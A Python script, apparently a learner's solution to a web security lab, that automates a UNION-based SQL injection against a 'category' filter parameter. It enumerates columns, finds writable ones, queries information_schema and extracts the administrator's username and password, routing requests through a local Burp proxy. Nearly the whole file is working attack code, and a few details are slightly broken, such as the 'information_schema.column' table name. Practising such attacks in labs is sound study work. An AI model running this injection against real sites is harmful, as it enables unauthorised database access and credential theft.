#! /usr/bin/env python

import requests  # to make web requests
import sys  # system module to use for arguments

#need to determine how many columns there are, then which ones are writable, then get the data. 

def column_enumeration(base_url: str) -> int: # the function column enumeration expects 1 argument called base_url,in the format of a string, and it returns an int variable which is the count
    null = "NULL" #adding null variable
    count = 1 #adding count so we can see how many columns there are
    while True:    
        response = requests.get(
            base_url + "/filter",
            params={"category": f'Clothing, shoes and accessories \' UNION SELECT {null}-- '},#fstring for nulls to dynamically add it in, needed to escape the ' before UNION so used \. 
            proxies={"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"},
            verify=False,
        )  # category is the key and the value is clothing, everything after the ? are the parameters in the URL also sending through Burp
        
        
        if response.status_code == 200:
            print(f"there are {count} columns in the table!") #used an f string to add the count variable in
            return count # this gives us the columns we have so that we can use it in the next stage/ other functions
            
        else:
            null = null + ",NULL" # once it fails we need to add more nulls onto the null variable for next itertation 
            count = count+1 # we increment the count to give us the next column number
           
        
def writeable_columns(column_number: int, base_url: str) -> None:  
    for count in range(2): #as we have 2 columns we need to stop at 2
        letter = ["NULL","NULL"] #maing our payload list
        letter[count] = "'a'" #adding null variable, having it iteratre through the list, using the count number so it goes a, null, null then null, a, null etc    
        response = requests.get(
            base_url + "/filter",
            params={"category": f'Clothing, shoes and accessories \' UNION SELECT {letter[0]}, {letter[1]}-- '},#fstring for nulls, adding the leters in for nulls to dynamically add it in, needed to escape the ' before UNION so used \. 
            proxies={"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"},
            verify=False,
        )  # category is the key and the value is clothing, everything after the ? are the parameters in the URL also sending through Burp
        
        if response.status_code == 200:
            print(f"column {count + 1} is writeable")
            
def extract_columninfo(base_url: str) -> None:
    response = requests.get(
            base_url + "/filter",
            params={"category": f'Clothing, shoes and accessories \' UNION SELECT table_name, column_name FROM information_schema.column-- '},#fstring with sqli payload to look for column and table name from information schema columns, it holds both the info.
            proxies={"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"},
            verify=False,
    )
    #print(response.text)
    
def extract_creds(base_url: str) -> None:    
    response = requests.get(
            base_url + "/filter",
            params={"category": f'Clothing, shoes and accessories \' UNION SELECT username_jqalxy, password_zuqfdr FROM users_jwhpfs WHERE username_jqalxy = \'administrator\'-- '},#fstring with sqli payload to look username and password from the table. the pg_user table was postgres default table so needed o look for another
            proxies={"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"},
            verify=False,
    ) 
    print(response.text)
    
    
def main() -> None:
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} ,<base_url>")
        exit(1)
    requests.packages.urllib3.disable_warnings()
    column_number = column_enumeration(sys.argv[1].rstrip("/")) #this is the return count varable from the column enuneration functuon. 
    no_of_writeable_columns = writeable_columns(column_number, sys.argv[1].rstrip("/")) #this returns the number of writeable columns and stores it in the variable no of writeable columns. Need to store the output of these functions in a variable otherwise they would run and just be binned.
    column_output = extract_columninfo(sys.argv[1].rstrip("/")) #this runs extract columninfo function and stores the response in column output variable.
    creds = extract_creds(sys.argv[1].rstrip("/")) #this runs extract creds function and stores the response in output variable.

if __name__ == "__main__":
    main()
